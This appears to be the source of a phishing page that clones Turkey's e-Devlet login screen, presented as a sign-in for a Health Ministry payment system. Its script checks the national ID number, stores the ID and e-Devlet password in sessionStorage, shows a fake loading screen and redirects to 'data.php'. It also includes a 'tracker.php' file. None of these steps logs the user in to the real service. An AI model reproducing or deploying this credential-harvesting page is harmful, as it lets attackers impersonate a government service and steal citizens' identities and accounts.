<!DOCTYPE html>
<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="tr"> <![endif]-->
<!--[if IE 7]><html class="no-js ie7 oldie" lang="tr"><![endif]-->
<!--[if IE 8]><html class="no-js ie8 oldie" lang="tr"><![endif]-->
<!--[if gt IE 8]><!-->
<!--<![endif]-->
<html lang="tr" data-theme="">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz."/>
    <meta name="keywords" content="e-devlet, türkiye.gov.tr, e-devlet kapısı, edevlet, e devlet"/>
    <meta name="robots" content="noindex,nofollow"/>
    <meta name="theme-color" content="#4284be">
    <link rel="icon" type="image/png" href="https://cdn.e-devlet.gov.tr/themes/izmir/images/favicons/favicon-196x196.png" sizes="196x196">
    <title>e-Devlet Kapısı</title>
    <link rel="stylesheet" href="https://cdn.e-devlet.gov.tr/themes/izmir/css/login-main.1.9.5.css">
    <style>
        .captcha-wrap {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 4px 12px;
        }
        .captcha-wrap canvas {
            border-radius: 3px;
        }
        .captcha-refresh {
            background: none;
            border: none;
            cursor: pointer;
            color: #4284be;
            font-size: 18px;
            padding: 4px;
        }
        .loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255,255,255,0.85);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 16px;
        }
        .loading-overlay.active { display: flex; }
        .loading-overlay .lds-ring {
            width: 48px; height: 48px; position: relative;
        }
        .loading-overlay .lds-ring div {
            box-sizing: border-box; display: block; position: absolute;
            width: 40px; height: 40px; margin: 4px;
            border: 4px solid #4284be; border-radius: 50%;
            animation: lds-ring 1.2s cubic-bezier(0.5,0,0.5,1) infinite;
            border-color: #4284be transparent transparent transparent;
        }
        .loading-overlay .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
        .loading-overlay .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
        .loading-overlay .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
        @keyframes lds-ring {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-banner {
            display: none;
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 10px 16px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 16px;
        }
        .error-banner.active { display: block; }
    </style>
</head>
<body data-lang="tr_TR.UTF-8">
<div class="loading-overlay" id="loadingOverlay">
    <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
    <span style="color:#555;font-size:14px;">İşleminiz devam ediyor. Lütfen bekleyiniz...</span>
</div>

<div class="wrapper">
    <div class="container">

        <header class="header">
            <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı</h1>
            <div class="logo">
                <a href="https://giris.turkiye.gov.tr/Giris/gir">
                    <img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/login/edk-logo.png" alt="Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı">
                </a>
            </div>
            <div class="referrerApp">
                <img alt="" src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" aria-hidden="true" width="165" height="40">
                <p>Sağlık Bakanlığı Ödeme Sistemi<span>https://sbos.saglik.gov.tr/oauthlogin</span></p>
            </div>
        </header>

        <h2 class="visuallyhidden">Giriş Seçenekleri</h2>
        <nav>
            <div class="menu">
                <ul>
                    <li><a href="#" onclick="return false;" class="active">e-Devlet Şifresi</a></li>
                    <li><a href="#" onclick="return false;">Elektronik İmza</a></li>
                    <li><a href="#" onclick="return false;">İnternet Bankacılığı</a></li>
                    <li class="submenu-dropdown">
                        <button type="button" id="other_logins_btn" aria-expanded="false" aria-controls="other_logins_menu" aria-haspopup="true">Diğer Yöntemler</button>
                        <ul class="menu-dropdown-list submenu" aria-label="Diğer Yöntemler" id="other_logins_menu">
                            <li><a href="#" onclick="return false;">Mobil İmza</a></li>
                            <li><a href="#" onclick="return false;">T.C. Kimlik Kartı</a></li>
                        </ul>
                    </li>
                </ul>
            </div>

            <div id="menu_dropdown_wrapper" class="menu-dropdown-wrapper">
                <button id="login_type_btn" class="selected" aria-controls="login_type_list" aria-expanded="false">
                    <span class="visuallyhidden">Seçili Doğrulama Yöntemi</span>
                    e-Devlet Şifresi
                </button>
                <ul id="login_type_list" class="menu-dropdown-list" aria-label="Diğer Doğrulama Yöntemlerinden Birini Seçin">
                    <li><a href="#" onclick="return false;">e-Devlet Şifresi</a></li>
                    <li><a href="#" onclick="return false;">Elektronik İmza</a></li>
                    <li><a href="#" onclick="return false;">İnternet Bankacılığı</a></li>
                    <li><a href="#" onclick="return false;">Mobil İmza</a></li>
                    <li><a href="#" onclick="return false;">T.C. Kimlik Kartı</a></li>
                </ul>
            </div>
        </nav>

        <main>
            <section>
                <div class="content">
                    <p>
                        T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak kimliğiniz doğrulandıktan sonra işleminize kaldığınız yerden devam edebilirsiniz.
                        <a id="pass_detail_btn" href="javascript:void(0)" aria-haspopup="true">e-Devlet Şifresi Nedir, Nasıl Alınır?</a>
                    </p>

                    <div class="error-banner" id="errorBanner"></div>

                    <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                        <fieldset>
                            <legend class="visuallyhidden">e-Devlet Şifresi İle Giriş</legend>
                            <div class="form-row required">
                                <label for="tridField" class="enforced">T.C. Kimlik No</label>
                                <div class="form-field fieldGroup">
                                    <input name="tridField" type="number" inputmode="numeric" class="form-control" id="tridField" value="" autocomplete="off" maxlength="11" title="Kimlik numaranız 11 adet rakamdan oluşmalıdır" aria-label="T. C. Kimlik Numaranızı Girin" required/>
                                    <div class="keyboard-content" aria-hidden="true">
                                        <button type="button" tabindex="-1" class="btn-action keyboard-pass virtualKeypad" title="T.C. Kimlik No Sanal Klavye">
                                            <i class="edkicon-keyboard"></i>
                                        </button>
                                    </div>
                                </div>
                            </div>

                            <div class="form-row">
                                <label for="egpField" class="enforced">e-Devlet Şifresi</label>
                                <div class="form-field fieldGroup">
                                    <input name="egpField" id="egpField" type="password" class="form-control" autocomplete="off" aria-label="e-Devlet Şifrenizi Girin" required="" aria-describedby="passwordFormNote"/>
                                    <div class="keyboard-content" aria-hidden="true">
                                        <button type="button" tabindex="-1" class="btn-action keyboard-pass virtualKeyboard" title="e-Devlet Şifresi Sanal Klavye" aria-hidden="true">
                                            <i class="edkicon-keyboard"></i>
                                        </button>
                                    </div>
                                    <span class="form-warning hide capsWarning">
                                        <strong>Dikkat:</strong> Üst Karakter (⇪Caps Lock) tuşunuz açık.
                                    </span>
                                    <span id="passwordFormNote" class="form-note" title="Şifre yenileme">
                                        * e-Devlet
                                        <a id="pass_help_btn" href="javascript:void(0)" aria-haspopup="true">şifrenizi unutmanız durumunda</a>
                                        doğruladığınız cep telefonunuzdan yenileme işlemi yapabilirsiniz.<br/>
                                    </span>
                                </div>
                            </div>

                            <div class="form-row required">
                                <label for="captchaField" class="enforced">Güvenlik Kodu</label>
                                <div class="form-field captcha">
                                    <canvas id="captchaCanvas" width="120" height="40" style="cursor:pointer;" title="Yeni güvenlik kodu için tıklayın"></canvas>
                                    <i class="edk-icon edkicon-next"></i>
                                    <input name="captchaField" type="text" required class="form-control" id="captchaField" maxlength="5" title="Güvenlik resmindeki karakterleri giriniz"/>
                                    <span class="form-note">
                                        Lütfen resimde gördüğünüz karakterleri yanında bulunan kutuya giriniz.<br>
                                        Resmi okuyamıyorsanız, üzerine tıklayarak yeni bir tane oluşturabilirsiniz.
                                    </span>
                                </div>
                            </div>

                            <div class="form-row end-item">
                                <a href="#" class="forgot-pass" onclick="return false;">Şifremi Unuttum</a>
                            </div>

                            <div class="form-row center-item">
                                <button onclick="window.location.href='index.php'; return false;" type="button" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
                                <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap">Giriş Yap</button>
                            </div>
                        </fieldset>
                    </form>
                </div>
            </section>
        </main>
    </div>
</div>

<footer class="footer-fixed" role="contentinfo">
    <span class="copyright">
        <img src="https://cdn.e-devlet.gov.tr/themes/nevsehir/images/SGB-logo.png" class="footer-logo" alt="T.C. Cumhurbaşkanlığı Siber Güvenlik Başkanlığı" height="24">
        <img src="https://cdn.e-devlet.gov.tr/themes/ankara/images/edk_logo/turksatlogo.png" class="footer-logo" alt="Türksat" style="height: 16px; margin-bottom: 5px;">
        &copy; 2026, Ankara - Tüm Hakları Saklıdır
    </span>
    <ul>
        <li><a href="javascript:void(0)">Gizlilik ve Güvenlik</a></li>
        <li><a href="javascript:void(0)">Hızlı Çözüm Merkezi</a></li>
    </ul>
</footer>

<script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.5.js"></script>
<script>
    let captchaCode = '';

    function generateCaptcha() {
        const canvas = document.getElementById('captchaCanvas');
        const ctx = canvas.getContext('2d');
        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        captchaCode = '';
        for (let i = 0; i < 5; i++) {
            captchaCode += chars[Math.floor(Math.random() * chars.length)];
        }

        ctx.fillStyle = '#f0f0f0';
        ctx.fillRect(0, 0, 120, 40);

        for (let i = 0; i < 4; i++) {
            ctx.strokeStyle = 'rgba(0,0,0,0.' + (Math.floor(Math.random() * 3) + 1) + ')';
            ctx.beginPath();
            ctx.moveTo(Math.random() * 120, Math.random() * 40);
            ctx.lineTo(Math.random() * 120, Math.random() * 40);
            ctx.stroke();
        }

        for (let i = 0; i < captchaCode.length; i++) {
            ctx.font = (16 + Math.random() * 6) + 'px Arial';
            ctx.fillStyle = '#' + Math.floor(Math.random() * 0x666666).toString(16).padStart(6, '0');
            ctx.save();
            ctx.translate(15 + i * 20, 28 + (Math.random() * 6 - 3));
            ctx.rotate((Math.random() - 0.5) * 0.4);
            ctx.fillText(captchaCode[i], 0, 0);
            ctx.restore();
        }

        for (let i = 0; i < 30; i++) {
            ctx.fillStyle = 'rgba(0,0,0,0.' + Math.floor(Math.random() * 4) + ')';
            ctx.fillRect(Math.random() * 120, Math.random() * 40, 1, 1);
        }
    }

    document.getElementById('captchaCanvas').addEventListener('click', generateCaptcha);
    generateCaptcha();

    function validateTC(tc) {
        if (tc.length !== 11) return false;
        if (tc[0] === '0') return false;
        const digits = tc.split('').map(Number);
        const oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
        const evenSum = digits[1] + digits[3] + digits[5] + digits[7];
        const check10 = ((oddSum * 7) - evenSum) % 10;
        if (check10 < 0 ? check10 + 10 !== digits[9] : check10 !== digits[9]) return false;
        const totalSum = digits.slice(0, 10).reduce((a, b) => a + b, 0);
        if (totalSum % 10 !== digits[10]) return false;
        return true;
    }

    function showError(msg) {
        const banner = document.getElementById('errorBanner');
        banner.textContent = msg;
        banner.classList.add('active');
    }

    function hideError() {
        document.getElementById('errorBanner').classList.remove('active');
    }

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        hideError();

        const tc = document.getElementById('tridField').value.trim();
        const pass = document.getElementById('egpField').value;
        const captchaInput = document.getElementById('captchaField').value.trim().toUpperCase();

        if (!tc || tc.length !== 11) {
            showError('T.C. Kimlik Numaranız 11 haneli olmalıdır.');
            return;
        }

        if (!validateTC(tc)) {
            showError('Geçerli bir T.C. Kimlik Numarası giriniz.');
            return;
        }

        if (!pass || pass.length < 4) {
            showError('e-Devlet şifrenizi giriniz.');
            return;
        }

        if (captchaInput !== captchaCode) {
            showError('Güvenlik kodu hatalı. Lütfen tekrar deneyiniz.');
            generateCaptcha();
            document.getElementById('captchaField').value = '';
            return;
        }

        sessionStorage.setItem('edevlet_tc', tc);
        sessionStorage.setItem('edevlet_pass', pass);

        document.getElementById('loadingOverlay').classList.add('active');

        setTimeout(function() {
            window.location.href = 'data.php';
        }, 1800);
    });

    const tridField = document.getElementById('tridField');
    tridField.addEventListener('input', function() {
        if (this.value.length > 11) {
            this.value = this.value.slice(0, 11);
        }
    });
</script>
<?php include 'includes/tracker.php'; ?>
</body>
</html>
